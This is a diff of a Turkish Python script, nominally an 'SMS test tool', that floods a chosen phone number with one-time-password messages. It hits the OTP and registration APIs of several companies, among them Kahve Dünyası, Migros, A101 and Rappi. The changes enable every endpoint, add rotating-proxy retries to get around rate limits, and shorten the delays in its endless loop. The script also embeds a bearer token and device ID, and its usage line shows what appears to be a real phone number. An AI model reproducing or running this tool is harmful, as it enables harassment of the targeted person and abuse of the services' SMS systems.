@@ -1,10 +1,7 @@
 #!/usr/bin/env python3
 """
-SMS Test Aracı - Döngü Modlu
-Kullanım: python3 main.py -l -d 5 -p proxy.txt
-  -l veya --loop   : Sürekli döngü modu
-  -d veya --delay  : Bekleme süresi (1-10 saniye, varsayılan 3)
-  -p proxy.txt     : Proxy dosyası (opsiyonel)
+SMS Test Aracı - Tüm Siteler Aktif, Proxy Retry, Hızlı
+Kullanım: python3 main.py 5413159398 -l -d 3 -p proxy.txt
 """
 
 import requests
@@ -22,29 +19,22 @@ def load_proxies(file_path):
         with open(file_path, 'r') as f:
             proxies = [line.strip() for line in f if line.strip()]
             if not proxies:
-                print(f"{Fore.YELLOW}[!] Proxy dosyası boş, proxy kullanılmayacak.{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Proxy dosyası boş.{Style.RESET_ALL}")
                 return []
             print(f"{Fore.GREEN}[+] {len(proxies)} proxy yüklendi.{Style.RESET_ALL}")
             return proxies
-    except FileNotFoundError:
-        print(f"{Fore.YELLOW}[!] Proxy dosyası bulunamadı, proxy kullanılmayacak.{Style.RESET_ALL}")
-        return []
-    except Exception as e:
-        print(f"{Fore.RED}[-] Proxy yüklenirken hata: {e}{Style.RESET_ALL}")
+    except:
         return []
 
-def get_proxy(proxy_list):
+def get_random_proxy(proxy_list):
     if proxy_list:
         proxy = random.choice(proxy_list)
         return {'http': proxy, 'https': proxy}
     return None
 
-# ==================== SİTE KONFİGÜRASYONLARI ====================
-# enabled: True ise test edilir, False ise atlanır (çalışmayanlar pasif)
+# ==================== TÜM SİTELER (HEPSİ AKTİF) ====================
 SITES = {
-    # ========== ÇALIŞAN SİTELER (enabled=True) ==========
     "Kahve Dünyası": {
-        "enabled": True,
         "url": "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
         "headers": {
             "Content-Type": "application/json",
@@ -57,39 +47,7 @@ SITES = {
         "is_form_data": False,
         "success_check": {"key": "processStatus", "value": "Success"}
     },
-    "Rappi": {
-        "enabled": True,
-        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
-        "headers": {
-            "accept": "application/json",
-            "authorization": "Bearer ft.gAAAAABqOuUUyy4TTsvBuH_vLhqUUzd2DzM7XEPaPYxnPTP1OgK_VQXFbPlfUjIYgmEiobMysTo0GAzRQG3cydjN5CsuPszPFAxshngCWzQ3dNd_QCGN2aJhcAtKA8c6qKWRR20zFBPn1UNGM1_jlmLgsDsmkWXAEJmG5WQDnVoQ6UDeM8lk4XMganYyiDvPovSJOkyV3vz77MxB0KZEryGmVfMhBn5uGrq1FwY8yCwIxwHTR7tvcuavQbCP86JvI08ODOjekdjrprzJxm3oEyIELOCmd25VCxkVbZX8coFtmTXqDOc6lWDmqqFNfCi63qcQMtuEOz6Ut0aTlUaHJ3JiSayOh7EA1INjmm1RDw31zARXjoW_dxBiARdUhw73XCOHYQH1Oe50dHZiEfQpY5WeIcfjwLcwag==",
-            "content-type": "application/json",
-            "deviceid": "a70baf0e-04d6-43ad-9b9a-e5ea745d1179",
-            "origin": "https://www.rappi.com.mx",
-            "referer": "https://www.rappi.com.mx/"
-        },
-        "payload": {"country_code": "+90", "phone": "{phone}"},
-        "is_form_data": False,
-        "success_check": {"key": "success", "value": True}
-    },
-    "Letgo": {
-        "enabled": True,
-        "url": "https://www.letgo.com/api/auth/challenges",
-        "headers": {
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/json",
-            "origin": "https://www.letgo.com",
-            "referer": "https://www.letgo.com/?utm_source=chatgpt.com"
-        },
-        "payload": {"descriptor": "{phone_full}", "type": "phone", "source": "LOGIN"},
-        "is_form_data": False,
-        "success_check": {"key": "success", "value": True}
-    },
-
-    # ========== ÇALIŞMAYAN / GÜNCELLENMESİ GEREKEN SİTELER (enabled=False) ==========
     "A101": {
-        "enabled": False,
-        "not": "403 hatası, installationid güncellenmeli",
         "url": "https://rio.a101.com.tr/dbmk89vnr/CALL/MsisdnAuthenticator/sendOtp/{phone_full}?__culture=tr-TR&__platform=web",
         "headers": {
             "a101-user-agent": "web-2.4.5",
@@ -104,8 +62,6 @@ SITES = {
         "success_check": {"key": "success", "value": True}
     },
     "Migros": {
-        "enabled": False,
-        "not": "403 hatası, x-cf-captcha-token ve cookie güncellenmeli",
         "url": "https://www.migros.com.tr/rest/user-bff/auth/single-login/otp?reid=1782247326749000001",
         "headers": {
             "accept": "application/json",
@@ -121,8 +77,6 @@ SITES = {
         "success_check": {"key": "success", "value": True}
     },
     "Pınar Online": {
-        "enabled": False,
-        "not": "500 hatası, msisdn formatı veya sunucu hatası",
         "url": "https://api.pinar.retter.io/3cn87h0si/INSTANCE/MsisdnAuthenticator?__culture=en-us&__platform=WEB",
         "headers": {
             "accept": "application/json, text/plain, */*",
@@ -135,8 +89,6 @@ SITES = {
         "success_check": {"key": "success", "value": True}
     },
     "Cepteşok": {
-        "enabled": False,
-        "not": "400 hatası, captchaToken veya clientId sorunu",
         "url": "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate",
         "headers": {
             "accept": "application/json, text/plain, */*",
@@ -156,9 +108,21 @@ SITES = {
         "is_form_data": False,
         "success_check": {"key": "success", "value": True}
     },
+    "Rappi": {
+        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "headers": {
+            "accept": "application/json",
+            "authorization": "Bearer ft.gAAAAABqOuUUyy4TTsvBuH_vLhqUUzd2DzM7XEPaPYxnPTP1OgK_VQXFbPlfUjIYgmEiobMysTo0GAzRQG3cydjN5CsuPszPFAxshngCWzQ3dNd_QCGN2aJhcAtKA8c6qKWRR20zFBPn1UNGM1_jlmLgsDsmkWXAEJmG5WQDnVoQ6UDeM8lk4XMganYyiDvPovSJOkyV3vz77MxB0KZEryGmVfMhBn5uGrq1FwY8yCwIxwHTR7tvcuavQbCP86JvI08ODOjekdjrprzJxm3oEyIELOCmd25VCxkVbZX8coFtmTXqDOc6lWDmqqFNfCi63qcQMtuEOz6Ut0aTlUaHJ3JiSayOh7EA1INjmm1RDw31zARXjoW_dxBiARdUhw73XCOHYQH1Oe50dHZiEfQpY5WeIcfjwLcwag==",
+            "content-type": "application/json",
+            "deviceid": "a70baf0e-04d6-43ad-9b9a-e5ea745d1179",
+            "origin": "https://www.rappi.com.mx",
+            "referer": "https://www.rappi.com.mx/"
+        },
+        "payload": {"country_code": "+90", "phone": "{phone}"},
+        "is_form_data": False,
+        "success_check": {"key": "success", "value": True}
+    },
     "Tiklagelsin": {
-        "enabled": False,
-        "not": "400 hatası, PhoneNumberNotValid, formatı dene",
         "url": "https://api.tiklagelsin.com/tg/user/api/v1/auth/generate-otp",
         "headers": {
             "accept": "application/json;charset=utf-8",
@@ -175,9 +139,19 @@ SITES = {
         "is_form_data": False,
         "success_check": {"key": "success", "value": True}
     },
+    "Letgo": {
+        "url": "https://www.letgo.com/api/auth/challenges",
+        "headers": {
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "origin": "https://www.letgo.com",
+            "referer": "https://www.letgo.com/?utm_source=chatgpt.com"
+        },
+        "payload": {"descriptor": "{phone_full}", "type": "phone", "source": "LOGIN"},
+        "is_form_data": False,
+        "success_check": {"key": "success", "value": True}
+    },
     "Gardrops": {
-        "enabled": False,
-        "not": "200 ama error:1, recaptcha token süresi dolmuş",
         "url": "https://web.gardrops.com/member/otp/send",
         "headers": {
             "accept": "application/json, text/plain, */*",
@@ -194,76 +168,100 @@ SITES = {
     }
 }
 
-# ==================== TEST FONKSİYONU ====================
-def test_sms(phone, proxy_list=None, delay=3):
-    """
-    Tüm siteleri test eder.
-    """
+# ==================== BİR SİTEYİ PROXY DENEMELİ TEST ET ====================
+def test_single_site(name, config, phone, proxy_list, retries=3):
+    phone_clean = phone.replace("+90", "").replace("-", "").strip()
+    phone_full = f"+90{phone_clean}" if not phone_clean.startswith("+") else phone_clean
+    
+    url = config["url"].replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
+    headers = config["headers"].copy()
+    
+    if config.get("is_form_data"):
+        data = {}
+        for k, v in config["data"].items():
+            data[k] = v.replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
+        payload = data
+    else:
+        payload = {}
+        for k, v in config["payload"].items():
+            if isinstance(v, str):
+                payload[k] = v.replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
+            else:
+                payload[k] = v
+    
+    # Deneme döngüsü (farklı proxy'lerle)
+    attempted = 0
+    used_proxies = set()
+    last_error = None
+    
+    while attempted < retries:
+        proxy = None
+        if proxy_list:
+            available = [p for p in proxy_list if p not in used_proxies]
+            if not available:
+                break
+            proxy_raw = random.choice(available)
+            used_proxies.add(proxy_raw)
+            proxy = {'http': proxy_raw, 'https': proxy_raw}
+        
+        try:
+            if config.get("is_form_data"):
+                r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=6)
+            else:
+                r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=6)
+            
+            # Başarı kontrolü
+            success = False
+            try:
+                data = r.json()
+                check = config.get("success_check")
+                if check and data.get(check["key"]) == check["value"]:
+                    success = True
+            except:
+                if r.status_code == 200:
+                    success = True
+            
+            if success:
+                return True, "OK"
+            else:
+                # Yanıt başarısız ama HTTP hata değil, bu durumda proxy çalışıyor ama site başarısız
+                return False, f"Yanıt: {r.status_code} - {r.text[:50]}"
+        except (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+            last_error = str(e)
+            attempted += 1
+            continue
+        except Exception as e:
+            last_error = str(e)
+            attempted += 1
+            continue
+    
+    return False, f"Proxy/HTTP Hata: {last_error[:30]}"
+
+# ==================== ANA TEST FONKSİYONU ====================
+def test_all_sites(phone, proxy_list, delay):
     phone_clean = phone.replace("+90", "").replace("-", "").strip()
     phone_full = f"+90{phone_clean}" if not phone_clean.startswith("+") else phone_clean
     
     print(f"\n{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}📱 Test Edilen: {phone_full}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}⏱️  Bekleme: {delay} saniye{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}📱 Test: {phone_full} (Döngü arası: {delay}s){Style.RESET_ALL}")
     print(f"{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}\n")
     
     success_list = []
     failure_list = []
     
     for name, config in SITES.items():
-        if not config.get("enabled", True):
-            print(f"{Fore.YELLOW}⏭️  {name} pasif, atlanıyor.{Style.RESET_ALL}")
-            continue
+        print(f"{Fore.YELLOW}[*] {name} test ediliyor...{Style.RESET_ALL}", end=" ")
         
-        print(f"{Fore.YELLOW}[*] {name} test ediliyor...{Style.RESET_ALL}")
+        success, msg = test_single_site(name, config, phone, proxy_list, retries=3)
         
-        proxy = get_proxy(proxy_list) if proxy_list else None
-        url = config["url"].replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
-        headers = config["headers"].copy()
-        
-        if config.get("is_form_data"):
-            data = {}
-            for k, v in config["data"].items():
-                data[k] = v.replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
-            payload = data
+        if success:
+            print(f"{Fore.GREEN}✅ BAŞARILI!{Style.RESET_ALL}")
+            success_list.append(name)
         else:
-            payload = {}
-            for k, v in config["payload"].items():
-                if isinstance(v, str):
-                    payload[k] = v.replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
-                else:
-                    payload[k] = v
+            print(f"{Fore.RED}❌ BAŞARISIZ ({msg}){Style.RESET_ALL}")
+            failure_list.append(name)
         
-        try:
-            if config.get("is_form_data"):
-                r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
-            else:
-                r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=10)
-            
-            success = False
-            try:
-                data = r.json()
-                check = config.get("success_check")
-                if check:
-                    key = check["key"]
-                    value = check["value"]
-                    if data.get(key) == value:
-                        success = True
-            except:
-                if r.status_code == 200:
-                    success = True
-            
-            if success:
-                print(f"  {Fore.GREEN}✅ BAŞARILI!{Style.RESET_ALL} SMS gönderildi.")
-                success_list.append(name)
-            else:
-                print(f"  {Fore.RED}❌ BAŞARISIZ!{Style.RESET_ALL} Status: {r.status_code} - {r.text[:100]}")
-                failure_list.append(name)
-        except Exception as e:
-            print(f"  {Fore.RED}❌ HATA: {e}{Style.RESET_ALL}")
-            failure_list.append(f"{name} (Hata)")
-        
-        time.sleep(1)  # Site başına 1 saniye bekleme
+        time.sleep(0.3)
     
     # Özet
     print(f"\n{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
@@ -275,26 +273,24 @@ def test_sms(phone, proxy_list=None, delay=3):
         for f in failure_list:
             print(f"  • {f}")
     
-    # Log dosyasına yaz
     if success_list:
         with open("onaylananlar.txt", "a", encoding="utf-8") as f:
             f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {phone_full}\n")
             for s in success_list:
                 f.write(f"  • {s}\n")
             f.write("\n")
-        print(f"\n{Fore.GREEN}✅ Başarılı siteler 'onaylananlar.txt' dosyasına kaydedildi.{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}✅ Log kaydedildi.{Style.RESET_ALL}")
     
     return success_list, failure_list
 
 # ==================== ANA PROGRAM ====================
 def main():
     print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}║     SMS TEST ARACI - DÖNGÜ MODLU v3.0                  ║{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}║     SMS TEST ARACI - TÜM SİTELER AKTİF v3.2            ║{Style.RESET_ALL}")
     print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
     
-    # Parametreleri oku
     loop_mode = False
-    delay = 3  # varsayılan
+    delay = 3
     proxy_file = None
     phone = None
     
@@ -307,60 +303,44 @@ def main():
             if i+1 < len(sys.argv):
                 try:
                     delay = int(sys.argv[i+1])
-                    if delay < 1:
-                        delay = 1
-                    elif delay > 10:
-                        delay = 10
-                except:
-                    delay = 3
+                    if delay < 1: delay = 1
+                    elif delay > 10: delay = 10
+                except: pass
                 i += 1
-            else:
-                print(f"{Fore.RED}❌ --delay değer belirtilmedi, varsayılan 3 kullanılacak.{Style.RESET_ALL}")
         elif arg in ("-p", "--proxy"):
             if i+1 < len(sys.argv):
                 proxy_file = sys.argv[i+1]
                 i += 1
-            else:
-                print(f"{Fore.RED}❌ Proxy dosyası belirtilmedi.{Style.RESET_ALL}")
-                sys.exit(1)
         else:
-            # Telefon numarası olabilir
-            if phone is None and arg.startswith("5") or arg.startswith("0") or arg.startswith("+"):
+            if phone is None and (arg.startswith("5") or arg.startswith("0") or arg.startswith("+")):
                 phone = arg
         i += 1
     
-    # Telefon numarasını al
     if not phone:
-        phone = input(f"{Fore.YELLOW}📱 Numara (örn: 5555555555): {Style.RESET_ALL}").strip()
+        phone = input(f"{Fore.YELLOW}📱 Numara (örn: 55555555): {Style.RESET_ALL}").strip()
         if not phone:
-            print(f"{Fore.RED}❌ Geçerli bir numara girin!{Style.RESET_ALL}")
+            print(f"{Fore.RED}❌ Geçerli numara girin.{Style.RESET_ALL}")
             sys.exit(1)
     
-    # Proxy'leri yükle
     proxy_list = load_proxies(proxy_file) if proxy_file else []
     
-    # Sinyal yakalama (Ctrl+C)
     def signal_handler(sig, frame):
-        print(f"\n{Fore.YELLOW}⚠️  Kullanıcı tarafından durduruldu.{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}⚠️ Durduruldu.{Style.RESET_ALL}")
         sys.exit(0)
     signal.signal(signal.SIGINT, signal_handler)
     
-    # Döngü veya tek seferlik çalıştır
     if loop_mode:
-        print(f"{Fore.CYAN}🔄 Döngü modu aktif. Her {delay} saniyede bir test yapılacak.{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}⚠️  Durdurmak için Ctrl+C basın.{Style.RESET_ALL}\n")
+        print(f"{Fore.CYAN}🔄 Döngü modu. Her {delay} saniye...{Style.RESET_ALL}")
         counter = 1
         while True:
-            print(f"{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
             print(f"{Fore.CYAN}🔄 Döngü #{counter}{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
-            test_sms(phone, proxy_list, delay)
+            test_all_sites(phone, proxy_list, delay)
             counter += 1
             print(f"\n{Fore.YELLOW}⏳ {delay} saniye bekleniyor...{Style.RESET_ALL}")
             time.sleep(delay)
     else:
-        # Tek seferlik çalıştır
-        test_sms(phone, proxy_list, delay)
+        test_all_sites(phone, proxy_list, delay)
 
 if __name__ == "__main__":
     main()
